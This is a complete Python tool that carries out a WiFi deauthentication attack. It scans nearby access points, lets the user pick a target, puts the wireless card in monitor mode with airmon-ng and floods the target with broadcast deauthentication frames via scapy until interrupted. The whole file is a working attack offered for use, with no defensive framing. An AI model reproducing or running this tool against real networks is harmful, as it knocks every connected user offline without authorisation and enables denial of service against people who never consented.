#!/usr/bin/env python

import colors
import subprocess
import re
import os
import time
import threading
import sys
from scapy.all import *


class Deauth(object):

    def __init__(self,
                 interface=None,
                 target_bssid=None):

        self.is_root()
        self.DEV_FILE_PATH = '/proc/net/dev'

        if interface is None:
            self.interface = self.getInterface()
        else:
            self.interface = interface

        self.BSSID, self.ESSID = self.monitorWifi(self.interface)

        if target_bssid is None:
            self.target_bssid, self.target_essid = self.parseResult()
        else:
            self.target_bssid = target_bssid
            self.target_essid = None

        self.startMon()
        self.monFace = self.monInterface()
        self.no_of_packets = 0
        self.INTER = 0.1

    @staticmethod
    def is_root():
        """
        Checks if program is running as root or not
        """

        if os.geteuid() != 0:
            colors.error('Please run as root')
            sys.exit(1)
        else:
            colors.success('Running as root')

    @staticmethod
    def getInterface():
        """
        Collects all the interfaces
        """

        colors.info('Collecting all the interfaces')

        p = subprocess.Popen(['ifconfig'], shell=False,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
        output, error = p.communicate()

        if error:
            print(error.decode('utf-8'))
            sys.exit(1)

        output = output.decode('utf-8')
        interfaces = re.findall('(.*): ', output)

        total_index = 0

        # Parse and print the collected interfaces
        print('*' * 25)
        print('Index'.ljust(8, ' '), '|', ' Interface '.ljust(12, ' '), '|')
        print('*' * 25)
        for index, interface in enumerate(interfaces):
            print(index, ' '.ljust(5), ' | ', interface.ljust(11, ' '), '|')
            total_index = total_index + 1
            print('-' * 25)

        intf = -1
        while intf > total_index or intf < 0:
            intf = int(input('\n>> Enter the index of the interface : ')
                       .strip())

        colors.info('Selected interface is : {}'.format(interfaces[intf]))
        return interfaces[intf]

    @staticmethod
    def monitorWifi(intf):
        """
        Monitor all the nearby WiFi devices
        and collect their BSSID, ESSID
        """

        t1 = time.time()

        BSSID = []
        ESSID = []
        command = "iwlist {} scanning | egrep 'Cell | ESSID'".format(intf)

        for current_scan in range(5):
            print('Started scan : {}, Total : 5'.format(current_scan), end='\r')
            output = subprocess.check_output(command, shell=True)
            output = output.decode('utf-8')

            found_bssid = re.findall('Address:(.*)', output)
            found_essid = re.findall('ESSID:(.*)', output)

            for bssid in found_bssid:
                if bssid not in BSSID:
                    BSSID.append(bssid)
            for essid in found_essid:
                if essid not in ESSID:
                    ESSID.append(essid)

        if len(BSSID) == len(ESSID):
            t2 = time.time()
            print('Scanning completed in : {}\n'.format(t2-t1))
            return BSSID, ESSID
        else:
            colors.error('Something went wrong, try again...')
            sys.exit(1)

    @staticmethod
    def quickExecute(command):
        """
        Quickly execute small commands
        """

        subprocess.check_output(command, shell=True)

    def parseResult(self):
        """
        Parses and beautifully print
        the monitored result
        """

        print('*' * 61)
        print('Index'.ljust(4), '|', ' ESSID '.ljust(30), '|', ' BSSID '.ljust(18), '|')
        print('*' * 61)

        for index in range(len(self.BSSID)):
            print(str(index).ljust(5), '|', self.ESSID[index].ljust(30), '|', self.BSSID[index].ljust(17), '|')
            print('-' * 61)

        print('\n')

        choice_target = -1
        while choice_target > len(self.BSSID) or choice_target < 0:
            choice_target = int(input('>> Enter the index of the target : '))

        return self.BSSID[choice_target], self.ESSID[choice_target]

    def startMon(self):
        """
        Puts the selected interface in monitor mode
        """

        colors.info('Killing all the process...')

        kill_process_command = 'airmon-ng check kill'
        self.quickExecute(kill_process_command)

        start_mon = subprocess.Popen(['airmon-ng start {}'.format(self.interface)],
                                     shell=True,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE)
        output, error = start_mon.communicate()

        if error:
            print(error.decode('utf-8'))
            sys.exit(1)

        colors.info('Monitor mode started')

    def monInterface(self):
        """
        Collects the name of the
        new monitor interface
        """

        with open(self.DEV_FILE_PATH) as file:
            data = file.read()
            mon_intf = re.findall(r'(mon[0-9]+|prism[0-9]+|\b([a-zA-Z0-9]+)mon)', data)
            return mon_intf[0][0]

    def startProcess(self):
        """
        Start sending deauth packets
        to the target bssid
        """

        t1 = time.time()

        if self.target_essid:
            colors.info('Targetting : {} : {}'.format(self.target_bssid, self.target_essid))
        else:
            colors.info('Targetting : {}'.format(self.target_bssid))
        colors.success('Deauthentication attack started')
        colors.info('Press CTRL+C to stop...')

        addr1 = 'ff:ff:ff:ff:ff:ff'
        PKT = RadioTap()/scapy.all.Dot11(addr1=addr1,
                                         addr2=self.target_bssid,
                                         addr3=self.target_bssid)/Dot11Deauth()

        try:
            while True:
                sendp(PKT, iface=self.monFace, count=1, inter=self.INTER, verbose=False)
                self.no_of_packets = self.no_of_packets + 1
                print('[+] Sent : {} packets'.format(self.no_of_packets), end='\r')
        except KeyboardInterrupt:
            self.restore()
        except Exception as e:
            print(e)
            sys.exit(1)
        finally:
            t2 = time.time()
            colors.success('Deauthentication attack completed in {}'.format(t2-t1))

    def restore(self):
        """
        Restore the network services
        """

        colors.info('[!] Restoring the network services...')

        command0 = 'airmon-ng stop {}'.format(self.monFace)
        command1 = 'service networking restart'
        command2 = 'service network-manager restart'
        self.quickExecute(command0)
        self.quickExecute(command1)
        self.quickExecute(command2)

        colors.success('Restored')
